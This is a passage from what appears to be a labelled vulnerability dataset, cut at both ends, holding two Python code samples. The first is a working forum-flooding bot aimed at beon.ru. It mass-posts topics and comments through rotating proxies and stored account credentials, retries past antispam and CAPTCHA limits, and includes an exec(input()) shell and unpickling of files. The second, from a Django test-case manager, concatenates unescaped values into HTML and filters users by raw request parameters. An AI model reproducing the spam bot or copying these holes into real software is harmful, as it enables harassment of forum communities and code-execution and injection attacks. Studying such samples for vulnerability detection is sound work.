self.pr_sa = 'ipc://wm-wpr.sock'\n        self.pr_ba = 'ipc://wm-back.sock'\n        self.userqueues = {}\n        self.usersfile = 'wm_users.pickle'\n        self.targetsfile = 'wm_targets.pickle'\n        self.bumplimitfile = 'wm_bumplimit.pickle'\n\n    def init_th_sock(self):\n        self.log.info(\n            'Initializing intraprocess signal socket %s', self.th_sa)\n        self.th_sock = self.p.ctx.socket(zmq.PUB)\n        self.th_sock.bind(self.th_sa)\n\n    def init_th_back_sock(self):\n        self.log.info(\n            'Initializing intraprocess backward socket %s', self.th_ba)\n        self.th_back_sock = self.p.ctx.socket(zmq.ROUTER)\n        self.th_back_sock.bind(self.th_ba)\n\n    def init_pr_sock(self):\n        self.log.info(\n            'Initializing interprocess signal socket %s', self.pr_sa)\n        self.pr_sock = self.p.ctx.socket(zmq.PUB)\n        self.pr_sock.bind(self.pr_sa)\n\n    def init_pr_back_sock(self):\n        self.log.info(\n            'Initializing interprocess backward socket %s', self.pr_ba)\n        self.pr_back_sock = self.p.ctx.socket(zmq.ROUTER)\n        self.pr_back_sock.bind(self.pr_ba)\n\n    def read_newproxies(self):\n        if not os.path.isfile(self.newproxyfile):\n            return\n        newproxies = set()\n        with open(self.newproxyfile, 'rt') as f:\n            for line in f:\n                try:\n                    line = line.rstrip('\\n')\n                    proxypair = tuple(line.split(' '))\n                    if len(proxypair) < 2:\n                        self.log.warning('Line %s has too few spaces', line)\n                        continue\n                    if len(proxypair) > 2:\n                        self.log.debug('Line %s has too much spaces', line)\n                        proxypair = (proxypair[0], proxypair[1])\n                    newproxies.add(proxypair)\n                except Exception as e:\n                    self.log.exception('Line %s raised exception %s', line, e)\n        # os.unlink(self.newproxyfile)\n        return newproxies.difference(self.proxylist)\n\n    def add_spawns(self, proxypairs):\n        while self.running.is_set():\n            try:\n                try:\n                    proxypair = proxypairs.pop()\n                except Exception:\n                    return\n                self.proxylist.add(proxypair)\n                for spawn in create_spawn(proxypair[0], proxypair[1], self.pc,\n                        self.get_userqueue):\n                    self.log.info('Created spawn %s', spawn.name)\n                    self.spawnqueue.put(spawn, False)\n            except Exception as e:\n                self.log.exception('Exception \"%s\" raised on create_spawn', e)\n\n    def spawn_workers(self, wclass, count, args=(), kvargs={}):\n        wname = str(wclass.__name__)\n        self.log.info('Starting %s(s)', wname)\n        if issubclass(wclass, workers.WZWorkerThread):\n            type_ = 0\n            if not hasattr(self, 'th_sock'):\n                self.init_th_sock()\n            if not hasattr(self, 'th_back_sock'):\n                self.init_th_back_sock()\n        elif issubclass(wclass, workers.WZWorkerProcess):\n            type_ = 1\n            if not hasattr(self, 'pr_sock'):\n                self.init_pr_sock()\n            if not hasattr(self, 'pr_back_sock'):\n                self.init_pr_back_sock()\n        else:\n            raise Exception('Unknown wclass type')\n        for i in range(count):\n            if not self.running.is_set():\n                break\n            try:\n                w = wclass(*args, name='.'.join(\n                    (wname, ('pr{0}' if type_ else 'th{0}').format(i))),\n                    **kvargs)\n                if type_ == 0:\n                    self.threads.append(w)\n                    w.start(self.p.ctx, self.th_sa)\n                elif type_ == 1:\n                    self.processes.append(w)\n                    w.start(self.pr_sa)\n            except Exception as e:\n                self.log.exception('Exception \"%s\" raised on %s spawn',\n                                   e, wname)\n\n    def spawn_nworkers(self, type_, fun, count, args=(), kvargs={}):\n        wname = str(fun.__name__)\n        self.log.info('Starting %s(s)', wname)\n        if type_ == 0:\n            if not hasattr(self, 'th_sock'):\n                self.init_th_sock()\n            if not hasattr(self, 'th_back_sock'):\n                self.init_th_back_sock()\n        elif type_ == 1:\n            if not hasattr(self, 'pr_sock'):\n                self.init_pr_sock()\n            if not hasattr(self, 'pr_back_sock'):\n                self.init_pr_back_sock()\n        else:\n            raise Exception('Unknown wclass type')\n        for i in range(count):\n            if not self.running.is_set():\n                break\n            try:\n                if type_ == 0:\n                    w = workers.WZWorkerThread(\n                        self.c.router_addr, fun, args, kvargs,\n                        name='.'.join((wname, 'th{0}'.format(i))))\n                    self.threads.append(w)\n                    w.start(self.p.ctx, self.th_sa)\n                elif type_ == 1:\n                    w = workers.WZWorkerProcess(self.c.router_addr, fun, args, kvargs,\n                        name='.'.join((wname, 'pr{0}'.format(i))))\n                    self.processes.append(w)\n                    w.start(self.pr_sa)\n            except Exception as e:\n                self.log.exception('Exception \"%s\" raised on %s spawn',\n                                   e, wname)\n\n    def spawn_wipethreads(self):\n        return self.spawn_nworkers(0, WipeThread, self.c.tcount,\n                                  (self.pc, self.spawnqueue))\n\n    def spawn_evaluators(self):\n        self.log.info('Initializing Evaluator')\n        from evproxy import EvaluatorProxy\n        def ev_init():\n            from lib.evaluators.PyQt4Evaluator import Evaluator\n            return Evaluator()\n        return self.spawn_nworkers(1, EvaluatorProxy, self.c.ecount,\n                                  (ev_init,))\n\n    def load_users(self):\n        if not os.path.isfile(self.usersfile):\n            return\n        with open(self.usersfile, 'rb') as f:\n            users = pickle.loads(f.read())\n        try:\n            for domain in users.keys():\n                uq = Queue()\n                for ud in users[domain]:\n                    self.log.debug('Loaded user %s:%s', domain, ud['login'])\n                    uq.put(ud)\n                self.userqueues[domain] = uq\n        except Exception as e:\n            self.log.exception(e)\n            self.log.error('Failed to load users')\n\n    def save_users(self):\n        users = {}\n        for d, uq in self.userqueues.items():\n            uqsize = uq.qsize()\n            uds = []\n            for i in range(uqsize):\n                uds.append(uq.get(False))\n            users[d] = uds\n        with open(self.usersfile, 'wb') as f:\n            f.write(pickle.dumps(users, pickle.HIGHEST_PROTOCOL))\n        self.log.info('Saved users')\n\n    def get_userqueue(self, domain):\n        try:\n            uq = self.userqueues[domain]\n        except KeyError:\n            self.log.info('Created userqueue for %s', domain)\n            uq = Queue()\n            self.userqueues[domain] = uq\n        return uq\n\n    def load_targets(self):\n        fname = self.targetsfile\n        if not os.path.isfile(fname):\n            return\n        with open(fname, 'rb') as f:\n            data = pickle.loads(f.read())\n        if 'targets' in data:\n            self.log.debug('Target list was loaded')\n            targets.update(data['targets'])\n        if 'forums' in data:\n            self.log.debug('Forum set was loaded')\n            forums.update(data['forums'])\n        if 'domains' in data:\n            self.log.debug('Domain set was loaded')\n            domains.update(data['domains'])\n        if 'sets' in data:\n            self.log.debug('Other sets were loaded')\n            self.pc.sets.update(data['sets'])\n\n    def load_bumplimit_set(self):\n        if not os.path.isfile(self.bumplimitfile):\n            return\n        with open(self.bumplimitfile, 'rb') as f:\n            self.pc.sets['bumplimit'].update(pickle.loads(f.read()))\n\n    def save_targets(self):\n        data = {\n            'targets': targets,\n            'forums': forums,\n            'domains': domains,\n            'sets': self.pc.sets,\n            }\n        with open(self.targetsfile, 'wb') as f:\n            f.write(pickle.dumps(data, pickle.HIGHEST_PROTOCOL))\n\n    def targets_from_witch(self):\n        for t in d.witch_targets:\n            if t['domain'] == 'beon.ru' and t['forum'] == 'anonymous':\n                try:\n                    add_target_exc(t['id'], t['user'])\n                except ValueError:\n                    pass\n\n    def terminate(self):\n        msg = [b'GLOBAL']\n        msg.extend(wzrpc.make_sig_msg(b'WZWorker', b'terminate', []))\n        if hasattr(self, 'th_sock'):\n            self.th_sock.send_multipart(msg)\n        if hasattr(self, 'pr_sock'):\n            self.pr_sock.send_multipart(msg)\n\n    def join_threads(self):\n        for t in self.threads:\n            t.join()\n\n    def send_passthrough(self, interface, method, frames):\n        msg = [frames[0]]\n        msg.extend(wzrpc.make_sig_msg(frames[1], frames[2], frames[3:]))\n        self.th_sock.send_multipart(msg)\n        self.pr_sock.send_multipart(msg)\n\n    def __call__(self, parent):\n        self.p = parent\n        self.log = parent.log\n        self.inter_sleep = parent.inter_sleep\n        self.running = parent.running\n        self.p.sig_sock.setsockopt(zmq.SUBSCRIBE, b'WipeManager')\n        self.p.wz.set_sig_handler(b'WipeManager', b'passthrough', self.send_passthrough)\n        if self.c.tcount > 0:\n            self.pc = ProcessContext(self.p.name, self.p.ctx,\n                self.c.router_addr, noproxy_rp)\n            self.spawnqueue = Queue()\n            self.load_bumplimit_set()\n            self.load_targets()\n            self.load_users()\n            self.spawn_wipethreads()\n        if self.c.ecount > 0:\n            self.spawn_evaluators()\n        try:\n            while self.running.is_set():\n                # self.targets_from_witch()\n                if self.c.tcount == 0:\n                    self.inter_sleep(5)\n                    continue\n                self.pc.check_waiting()\n                new = self.read_newproxies()\n                if not new:\n                    self.inter_sleep(5)\n                    continue\n                self.add_spawns(new)\n        except WorkerInterrupt:\n            pass\n        except Exception as e:\n            self.log.exception(e)\n        self.terminate()\n        self.join_threads()\n        if self.c.tcount > 0:\n            self.save_users()\n            self.save_targets()\n\nwm = workers.WZWorkerThread(c.router_addr, WipeManager, (c,),\n    name='SpaghettiMonster')\nwm.start(ctx, sig_addr)\n\ndef add_target(domain, id_, tuser=None):\n    if domain not in targets:\n        targets[domain] = []\n    tlist = targets[domain]\n    id_ = str(id_)\n    tuser = tuser or ''\n    t = (tuser, id_)\n    logger.info('Appending %s to targets[%s]', repr(t), domain)\n    tlist.append(t)\n\ndef remove_target(domain, id_, tuser=None):\n    tlist = targets[domain]\n    id_ = str(id_)\n    tuser = tuser or ''\n    t = (tuser, id_)\n    logger.info('Removing %s from targets[%s]', repr(t), domain)\n    tlist.remove(t)\n\ndef add_target_exc(domain, id_, tuser=None):\n    if domain not in targets:\n        targets[domain] = []\n    tlist = targets[domain]\n    id_ = str(id_)\n    tuser = tuser or ''\n    t = (tuser, id_)\n    if t in protected:\n        raise ValueError('%s is protected' % repr(t))\n    if t not in tlist:\n        logger.info('Appending %s to targets[%s]', repr(t), domain)\n        tlist.append(t)\n\nr_di = re.compile(regexp.f_udi)\n\ndef atfu(urls):\n    for user, domain, id1, id2 in r_di.findall(urls):\n        id_ = id1+id2\n        add_target(domain, id_, user)\n\ndef rtfu(urls):\n    for user, domain, id1, id2 in r_di.findall(urls):\n        id_ = id1+id2\n        remove_target(domain, id_, user)\n\ndef get_forum_id(name):\n    id_ = d.bm_id_forum.get_key(name)\n    int(id_, 10)  # id is int with base 10\n    return id_\n\n# def aftw(name):\n#     id_ = get_forum_id(name)\n#     logger.info('Appending %s (%s) to forums', name, id_)\n#     forums.append(id_)\n\n# def rffw(name):\n#     id_ = get_forum_id(name)\n#     logger.info('Removing %s (%s) from forums', name, id_)\n#     forums.remove(id_)\n\n# def aftw(name):\n#     id_ = get_forum_id(name)\n#     logger.info('Appending %s to forums', name)\n#     forums.add(name)\n\n# def rffw(name):\n#     id_ = get_forum_id(name)\n#     logger.info('Removing %s from forums', name)\n#     forums.remove(name)\n\nr_udf = re.compile(regexp.udf_prefix)\n\ndef affu(urls):\n    for user, domain, forum in r_udf.findall(urls):\n        if domain not in forums:\n            forums[domain] = set()\n        if len(forum) > 0:\n            get_forum_id(forum)\n        logger.info('Appending %s:%s to forums[%s]', user, forum, domain)\n        forums[domain].add((user, forum))\n\ndef rffu(urls):\n    for user, domain, forum in r_udf.findall(urls):\n        if len(forum) > 0:\n            get_forum_id(forum)\n        logger.info('Removing %s:%s from forums[%s]', user, forum, domain)\n        forums[domain].remove((user, forum))\n\ndef add_user(domain, login, passwd):\n    uq = wm.get_userqueue(domain)\n    uq.put({'login': login, 'passwd': passwd}, False)\n\ndef send_to_wm(frames):\n    msg = [frames[0]]\n    msg.extend(wzrpc.make_sig_msg(frames[1], frames[2], frames[3:]))\n    sig_sock.send_multipart(msg)\n\ndef send_passthrough(frames):\n    msg = [b'WipeManager']\n    msg.extend(wzrpc.make_sig_msg(b'WipeManager', b'passthrough', frames))\n    sig_sock.send_multipart(msg)\n\ndef drop_users():\n    send_passthrough([b'WipeSkel', b'WipeSkel', b'drop-user'])\n\ndef log_spawn_name():\n    send_passthrough([b'WipeThread', b'WipeThread', b'log-spawn-name'])\n\nif c.no_shell:\n    while True:\n        time.sleep(1)\nelse:\n    try:\n        import IPython\n        IPython.embed()\n    except ImportError:\n        # fallback shell\n        while True:\n            try:\n                exec(input('> '))\n            except KeyboardInterrupt:\n                print(\"KeyboardInterrupt\")\n            except SystemExit:\n                break\n            except:\n                print(traceback.format_exc())\n\nterminate()\n/n/n/n/uniwipe.py/n/n# -*- coding: utf-8 -*-\n# -*- mode: python -*-\nfrom sup.net import NetError\nfrom wzworkers import WorkerInterrupt\nfrom wipeskel import WipeSkel, WipeState, cstate\nfrom beon import exc, regexp\nimport re\n\nclass UniWipe(WipeSkel):\n    def __init__(self, forums, targets, sbjfun, msgfun, *args, **kvargs):\n        self.sbjfun = sbjfun\n        self.msgfun = msgfun\n        self.forums = forums\n        self.targets = (type(targets) == str and [('', targets)]\n                        or type(targets) == tuple and list(targets)\n                        or targets)\n        super().__init__(*args, **kvargs)\n\n    def on_caprate_limit(self, rate):\n        if not self.logined:\n            self._capdata = (0, 0)\n            return\n        self.log.warning('Caprate limit reached, calling dologin() for now')\n        self.dologin()\n        # super().on_caprate_limit(rate)\n\n    def comment_loop(self):\n        for t in self.targets:\n            self.schedule(self.add_comment, (t, self.msgfun()))\n        if len(self.targets) == 0:\n            self.schedule(self.scan_targets_loop)\n        else:\n            self.schedule(self.comment_loop)\n\n    def add_comment(self, t, msg):\n        # with cstate(self, WipeState.posting_comment):\n        if True: # Just a placeholder\n            try:\n                # self.counter_tick()\n                self.postmsg(t[1], msg, t[0])\n            except exc.Success as e:\n                self.counters['comments'] += 1\n                self.w.sleep(self.comment_successtimeout)\n            except exc.Antispam as e:\n                self.w.sleep(self.comment_successtimeout)\n                self.schedule(self.add_comment, (t, msg))\n            except (exc.Closed, exc.UserDeny) as e:\n                try:\n                    self.targets.remove(t)\n                except ValueError:\n                    pass\n                self.w.sleep(self.comment_successtimeout)\n            except exc.Captcha as e:\n                self.log.error('Too many wrong answers to CAPTCHA')\n                self.schedule(self.add_comment, (t, msg))\n            except exc.UnknownAnswer as e:\n                self.log.warn('%s: %s', e, e.answer)\n                self.schedule(self.add_comment, (t, msg))\n            except exc.Wait5Min as e:\n                self.schedule(self.add_comment, (t, msg))\n                self.schedule_first(self.switch_user)\n            except exc.EmptyAnswer as e:\n                self.log.info('Removing %s from targets', t)\n                try:\n                    self.targets.remove(t)\n                except ValueError as e:\n                    pass\n                self.w.sleep(self.errortimeout)\n            except exc.TemporaryError as e:\n                self.schedule(self.add_comment, (t, msg))\n                self.w.sleep(self.errortimeout)\n            except exc.PermanentError as e:\n                try:\n                    self.targets.remove(t)\n                except ValueError as e:\n                    pass\n                self.w.sleep(self.errortimeout)\n            except UnicodeDecodeError as e:\n                self.log.exception(e)\n                self.w.sleep(self.errortimeout)\n\n    def forumwipe_loop(self):\n        for f in self.forums:\n            self.counter_tick()\n            try:\n                self.addtopic(self.msgfun(), self.sbjfun(), f)\n            except exc.Success as e:\n                self.counters['topics'] += 1\n                self.w.sleep(self.topic_successtimeout)\n            except exc.Wait5Min as e:\n                self.topic_successtimeout = self.topic_successtimeout + 0.1\n                self.log.info('Wait5Min exc caught, topic_successtimeout + 0.1, cur: %f',\n                    self.topic_successtimeout)\n                self.w.sleep(self.topic_successtimeout)\n            except exc.Captcha as e:\n                self.log.error('Too many wrong answers to CAPTCHA')\n                self.long_sleep(10)\n            except exc.UnknownAnswer as e:\n                self.log.warning('%s: %s', e, e.answer)\n                self.w.sleep(self.errortimeout)\n            except exc.PermanentError as e:\n                self.log.error(e)\n                self.w.sleep(self.errortimeout)\n            except exc.TemporaryError as e:\n                self.log.warn(e)\n                self.w.sleep(self.errortimeout)\n\n    def get_targets(self):\n        found_count = 0\n        for user, forum in self.forums:\n            targets = []\n            self.log.debug('Scanning first page of the forum %s:%s', user, forum)\n            page = self.site.get_page('1', forum, user)\n            rxp = re.compile(regexp.f_sub_id.format(user, self.site.domain, forum))\n            found = set(map(lambda x: (user, x[0]+x[1]), rxp.findall(page)))\n            for t in found:\n                if (t in self.pc.sets['closed']\n                    or t in self.pc.sets['bumplimit']\n                    or t in self.targets):\n                    continue\n                targets.append(t)\n            lt = len(targets)\n            found_count += lt\n            if lt > 0:\n                self.log.info('Found %d new targets in forum %s:%s', lt, user, forum)\n            else:\n                self.log.debug('Found no new targets in forum %s:%s', user, forum)\n            self.targets.extend(targets)\n        return found_count\n\n    def scan_targets_loop(self):\n        with cstate(self, WipeState.scanning_for_targets):\n            while len(self.targets) == 0:\n                c = self.get_targets()\n                if c == 0:\n                    self.log.info('No targets found at all, sleeping for 30 seconds')\n                    self.long_sleep(30)\n            self.schedule(self.comment_loop)\n        if len(self.forums) == 0:\n            self.schedule(self.wait_loop)\n\n    def wait_loop(self):\n        if len(self.targets) > 0:\n            self.schedule(self.comment_loop)\n            return\n        if len(self.forums) == 0:\n            with cstate(self, WipeState.waiting_for_targets):\n                while len(self.forums) == 0:\n                    # To prevent a busy loop.\n                    self.counter_tick()\n                    self.w.sleep(1)\n        self.schedule(self.scan_targets_loop)\n\n    def _run(self):\n        self.schedule(self.dologin)\n        self.schedule(self.wait_loop)\n        self.schedule(self.counter_ticker.tick)\n        try:\n            self.perform_tasks()\n        except NetError as e:\n            self.log.error(e)\n        except WorkerInterrupt as e:\n            self.log.warning(e)\n        except Exception as e:\n            self.log.exception(e)\n        self.return_user()\n# tw_flag = False\n# if len(self.targets) > 0:\n#     with cstate(self, WipeState.posting_comment):\n#         while len(self.targets) > 0:\n#             self.threadwipe_loop()\n#     if not tw_flag:\n#         tw_flag = True\n# if tw_flag:\n#     # Sleep for topic_successtimeout after last comment\n#     # to prevent a timeout spike\n#     self.w.sleep(self.topic_successtimeout)\n#     tw_flag = False\n# with cstate(self, WipeState.posting_topic):\n# self.forumwipe_loop()\n/n/n/n", "label": 1, "vtype": "remote_code_execution"}, {"id": "bb986000ed3cb222832e1e4535dd6316d32503f8", "code": "tcms/core/ajax.py/n/n# -*- coding: utf-8 -*-\n\"\"\"\nShared functions for plan/case/run.\n\nMost of these functions are use for Ajax.\n\"\"\"\nimport datetime\nimport json\nfrom distutils.util import strtobool\n\nfrom django import http\nfrom django.db.models import Q, Count\nfrom django.contrib.auth.models import User\nfrom django.core import serializers\nfrom django.core.exceptions import ObjectDoesNotExist\nfrom django.apps import apps\nfrom django.forms import ValidationError\nfrom django.http import Http404\nfrom django.http import HttpResponse\nfrom django.shortcuts import render\nfrom django.views.decorators.http import require_GET\nfrom django.views.decorators.http import require_POST\n\nfrom tcms.signals import POST_UPDATE_SIGNAL\nfrom tcms.management.models import Component, Build, Version\nfrom tcms.management.models import Priority\nfrom tcms.management.models import Tag\nfrom tcms.management.models import EnvGroup, EnvProperty, EnvValue\nfrom tcms.testcases.models import TestCase, Bug\nfrom tcms.testcases.models import Category\nfrom tcms.testcases.models import TestCaseStatus, TestCaseTag\nfrom tcms.testcases.views import plan_from_request_or_none\nfrom tcms.testplans.models import TestPlan, TestCasePlan, TestPlanTag\nfrom tcms.testruns.models import TestRun, TestCaseRun, TestCaseRunStatus, TestRunTag\nfrom tcms.core.helpers.comments import add_comment\nfrom tcms.core.utils.validations import validate_bug_id\n\n\ndef check_permission(request, ctype):\n    perm = '%s.change_%s' % tuple(ctype.split('.'))\n    if request.user.has_perm(perm):\n        return True\n    return False\n\n\ndef strip_parameters(request_dict, skip_parameters):\n    parameters = {}\n    for key, value in request_dict.items():\n        if key not in skip_parameters and value:\n            parameters[str(key)] = value\n\n    return parameters\n\n\n@require_GET\ndef info(request):\n    \"\"\"Ajax responder for misc information\"\"\"\n\n    objects = _InfoObjects(request=request, product_id=request.GET.get('product_id'))\n    info_type = getattr(objects, request.GET.get('info_type'))\n\n    if not info_type:\n        return HttpResponse('Unrecognizable info-type')\n\n    if request.GET.get('format') == 'ulli':\n        field = request.GET.get('field', default='name')\n\n        response_str = '<ul>'\n        for obj_value in info_type().values(field):\n            response_str += '<li>' + obj_value.get(field, None) + '</li>'\n        response_str += '</ul>'\n\n        return HttpResponse(response_str)\n\n    return HttpResponse(serializers.serialize('json', info_type(), fields=('name', 'value')))\n\n\nclass _InfoObjects(object):\n\n    def __init__(self, request, product_id=None):\n        self.request = request\n        try:\n            self.product_id = int(product_id)\n        except (ValueError, TypeError):\n            self.product_id = 0\n\n    def builds(self):\n        try:\n            is_active = strtobool(self.request.GET.get('is_active', default='False'))\n        except (ValueError, TypeError):\n            is_active = False\n\n        return Build.objects.filter(product_id=self.product_id, is_active=is_active)\n\n    def categories(self):\n        return Category.objects.filter(product__id=self.product_id)\n\n    def components(self):\n        return Component.objects.filter(product__id=self.product_id)\n\n    def env_groups(self):\n        return EnvGroup.objects.all()\n\n    def env_properties(self):\n        if self.request.GET.get('env_group_id'):\n            return EnvGroup.objects.get(id=self.request.GET['env_group_id']).property.all()\n        return EnvProperty.objects.all()\n\n    def env_values(self):\n        return EnvValue.objects.filter(property__id=self.request.GET.get('env_property_id'))\n\n    def users(self):\n        query = strip_parameters(self.request.GET, skip_parameters=('info_type', 'field', 'format'))\n        return User.objects.filter(**query)\n\n    def versions(self):\n        return Version.objects.filter(product__id=self.product_id)\n\n\ndef tags(request):\n    \"\"\" Get tags for TestPlan, TestCase or TestRun \"\"\"\n\n    tag_objects = _TagObjects(request)\n    template_name, obj = tag_objects.get()\n\n    q_tag = request.GET.get('tags')\n    q_action = request.GET.get('a')\n\n    if q_action:\n        tag_actions = _TagActions(obj=obj, tag_name=q_tag)\n        getattr(tag_actions, q_action)()\n\n    all_tags = obj.tag.all().order_by('pk')\n    test_plan_tags = TestPlanTag.objects.filter(\n        tag__in=all_tags).values('tag').annotate(num_plans=Count('tag')).order_by('tag')\n    test_case_tags = TestCaseTag.objects.filter(\n        tag__in=all_tags).values('tag').annotate(num_cases=Count('tag')).order_by('tag')\n    test_run_tags = TestRunTag.objects.filter(\n        tag__in=all_tags).values('tag').annotate(num_runs=Count('tag')).order_by('tag')\n\n    plan_counter = _TagCounter('num_plans', test_plan_tags)\n    case_counter = _TagCounter('num_cases', test_case_tags)\n    run_counter = _TagCounter('num_runs', test_run_tags)\n\n    for tag in all_tags:\n        tag.num_plans = plan_counter.calculate_tag_count(tag)\n        tag.num_cases = case_counter.calculate_tag_count(tag)\n        tag.num_runs = run_counter.calculate_tag_count(tag)\n\n    context_data = {\n        'tags': all_tags,\n        'object': obj,\n    }\n    return render(request, template_name, context_data)\n\n\nclass _TagObjects(object):\n    \"\"\" Used for getting the chosen object(TestPlan, TestCase or TestRun) from the database \"\"\"\n\n    def __init__(self, request):\n        \"\"\"\n        :param request: An HTTP GET request, containing the primary key\n                        and the type of object to be selected\n        :type request: HttpRequest\n        \"\"\"\n        for obj in ['plan', 'case', 'run']:\n            if request.GET.get(obj):\n                self.object = obj\n                self.object_pk = request.GET.get(obj)\n                break\n\n    def get(self):\n        func = getattr(self, self.object)\n        return func()\n\n    def plan(self):\n        return 'management/get_tag.html', TestPlan.objects.get(pk=self.object_pk)\n\n    def case(self):\n        return 'management/get_tag.html', TestCase.objects.get(pk=self.object_pk)\n\n    def run(self):\n        return 'run/get_tag.html', TestRun.objects.get(pk=self.object_pk)\n\n\nclass _TagActions(object):\n    \"\"\" Used for performing the 'add' and 'remove' actions on a given tag \"\"\"\n\n    def __init__(self, obj, tag_name):\n        \"\"\"\n        :param obj: the object for which the tag actions would be performed\n        :type obj: either a :class:`tcms.testplans.models.TestPlan`,\n                          a :class:`tcms.testcases.models.TestCase` or\n                          a :class:`tcms.testruns.models.TestRun`\n        :param tag_name: The name of the tag to be manipulated\n        :type tag_name: str\n        \"\"\"\n        self.obj = obj\n        self.tag_name = tag_name\n\n    def add(self):\n        tag, _ = Tag.objects.get_or_create(name=self.tag_name)\n        self.obj.add_tag(tag)\n\n    def remove(self):\n        tag = Tag.objects.get(name=self.tag_name)\n        self.obj.remove_tag(tag)\n\n\nclass _TagCounter(object):\n    \"\"\" Used for counting the number of times a tag is assigned to TestRun/TestCase/TestPlan \"\"\"\n\n    def __init__(self, key, test_tags):\n        \"\"\"\n         :param key: either 'num_plans', 'num_cases', 'num_runs', depending on what you want count\n         :type key: str\n         :param test_tags: query set, containing the Tag->Object relationship, ordered by tag and\n                            annotated by key\n            e.g. TestPlanTag, TestCaseTag ot TestRunTag\n         :type test_tags: QuerySet\n        \"\"\"\n        self.key = key\n        self.test_tags = iter(test_tags)\n        self.counter = {'tag': 0}\n\n    def calculate_tag_count(self, tag):\n        \"\"\"\n        :param tag: the tag you do the counting for\n        :type tag: :class:`tcms.management.models.Tag`\n        :return: the number of times a tag is assigned to object\n        :rtype: int\n        \"\"\"\n        if self.counter['tag'] != tag.pk:\n            try:\n                self.counter = self.test_tags.__next__()\n            except StopIteration:\n                return 0\n\n        if tag.pk == self.counter['tag']:\n            return self.counter[self.key]\n        return 0\n\n\ndef get_value_by_type(val, v_type):\n    \"\"\"\n    Exampls:\n    1. get_value_by_type('True', 'bool')\n    (1, None)\n    2. get_value_by_type('19860624 123059', 'datetime')\n    (datetime.datetime(1986, 6, 24, 12, 30, 59), None)\n    3. get_value_by_type('5', 'int')\n    ('5', None)\n    4. get_value_by_type('string', 'str')\n    ('string', None)\n    5. get_value_by_type('everything', 'None')\n    (None, None)\n    6. get_value_by_type('buggy', 'buggy')\n    (None, 'Unsupported value type.')\n    7. get_value_by_type('string', 'int')\n    (None, \"invalid literal for int() with base 10: 'string'\")\n    \"\"\"\n    value = error = None\n\n    def get_time(time):\n        date_time = datetime.datetime\n        if time == 'NOW':\n            return date_time.now()\n        return date_time.strptime(time, '%Y%m%d %H%M%S')\n\n    pipes = {\n        # Temporary solution is convert all of data to str\n        # 'bool': lambda x: x == 'True',\n        'bool': lambda x: x == 'True' and 1 or 0,\n        'datetime': get_time,\n        'int': lambda x: str(int(x)),\n        'str': lambda x: str(x),\n        'None': lambda x: None,\n    }\n    pipe = pipes.get(v_type, None)\n    if pipe is None:\n        error = 'Unsupported value type.'\n    else:\n        try:\n            value = pipe(val)\n        except Exception as e:\n            error = str(e)\n    return value, error\n\n\ndef say_no(error_msg):\n    ajax_response = {'rc': 1, 'response': error_msg}\n    return HttpResponse(json.dumps(ajax_response))\n\n\ndef say_yes():\n    return HttpResponse(json.dumps({'rc': 0, 'response': 'ok'}))\n\n\n# Deprecated. Not flexible.\n@require_POST\ndef update(request):\n    \"\"\"\n    Generic approach to update a model,\\n\n    based on contenttype.\n    \"\"\"\n    now = datetime.datetime.now()\n\n    data = request.POST.copy()\n    ctype = data.get(\"content_type\")\n    vtype = data.get('value_type', 'str')\n    object_pk_str = data.get(\"object_pk\")\n    field = data.get('field')\n    value = data.get('value')\n\n    object_pk = [int(a) for a in object_pk_str.split(',')]\n\n    if not field or not value or not object_pk or not ctype:\n        return say_no(\n            'Following fields are required - content_type, '\n            'object_pk, field and value.')\n\n    # Convert the value type\n    # FIXME: Django bug here: update() keywords must be strings\n    field = str(field)\n\n    value, error = get_value_by_type(value, vtype)\n    if error:\n        return say_no(error)\n    has_perms = check_permission(request, ctype)\n    if not has_perms:\n        return say_no('Permission Dinied.')\n\n    model = apps.get_model(*ctype.split(\".\", 1))\n    targets = model._default_manager.filter(pk__in=object_pk)\n\n    if not targets:\n        return say_no('No record found')\n    if not hasattr(targets[0], field):\n        return say_no('%s has no field %s' % (ctype, field))\n\n    if hasattr(targets[0], 'log_action'):\n        for t in targets:\n            try:\n                t.log_action(\n                    who=request.user,\n                    action='Field %s changed from %s to %s.' % (\n                        field, getattr(t, field), value\n                    )\n                )\n            except (AttributeError, User.DoesNotExist):\n                pass\n    objects_update(targets, **{field: value})\n\n    if hasattr(model, 'mail_scene'):\n        mail_context = model.mail_scene(\n            objects=targets, field=field, value=value, ctype=ctype,\n            object_pk=object_pk,\n        )\n        if mail_context:\n            from tcms.core.utils.mailto import mailto\n\n            mail_context['context']['user'] = request.user\n            try:\n                mailto(**mail_context)\n            except Exception:  # nosec:B110:try_except_pass\n                pass\n\n    # Special hacking for updating test case run status\n    if ctype == 'testruns.testcaserun' and field == 'case_run_status':\n        for t in targets:\n            field = 'close_date'\n            t.log_action(\n                who=request.user,\n                action='Field %s changed from %s to %s.' % (\n                    field, getattr(t, field), now\n                )\n            )\n            if t.tested_by != request.user:\n                field = 'tested_by'\n                t.log_action(\n                    who=request.user,\n                    action='Field %s changed from %s to %s.' % (\n                        field, getattr(t, field), request.user\n                    )\n                )\n\n            field = 'assignee'\n            try:\n                assignee = t.assginee\n                if assignee != request.user:\n                    t.log_action(\n                        who=request.user,\n                        action='Field %s changed from %s to %s.' % (\n                            field, getattr(t, field), request.user\n                        )\n                    )\n                    # t.assignee = request.user\n                t.save()\n            except (AttributeError, User.DoesNotExist):\n                pass\n        targets.update(close_date=now, tested_by=request.user)\n    return say_yes()\n\n\n@require_POST\ndef update_case_run_status(request):\n    \"\"\"\n    Update Case Run status.\n    \"\"\"\n    now = datetime.datetime.now()\n\n    data = request.POST.copy()\n    ctype = data.get(\"content_type\")\n    vtype = data.get('value_type', 'str')\n    object_pk_str = data.get(\"object_pk\")\n    field = data.get('field')\n    value = data.get('value')\n\n    object_pk = [int(a) for a in object_pk_str.split(',')]\n\n    if not field or not value or not object_pk or not ctype:\n        return say_no(\n            'Following fields are required - content_type, '\n            'object_pk, field and value.')\n\n    # Convert the value type\n    # FIXME: Django bug here: update() keywords must be strings\n    field = str(field)\n\n    value, error = get_value_by_type(value, vtype)\n    if error:\n        return say_no(error)\n    has_perms = check_permission(request, ctype)\n    if not has_perms:\n        return say_no('Permission Dinied.')\n\n    model = apps.get_model(*ctype.split(\".\", 1))\n    targets = model._default_manager.filter(pk__in=object_pk)\n\n    if not targets:\n        return say_no('No record found')\n    if not hasattr(targets[0], field):\n        return say_no('%s has no field %s' % (ctype, field))\n\n    if hasattr(targets[0], 'log_action'):\n        for t in targets:\n            try:\n                t.log_action(\n                    who=request.user,\n                    action='Field {} changed from {} to {}.'.format(\n                        field,\n                        getattr(t, field),\n                        TestCaseRunStatus.id_to_string(value),\n                    )\n                )\n            except 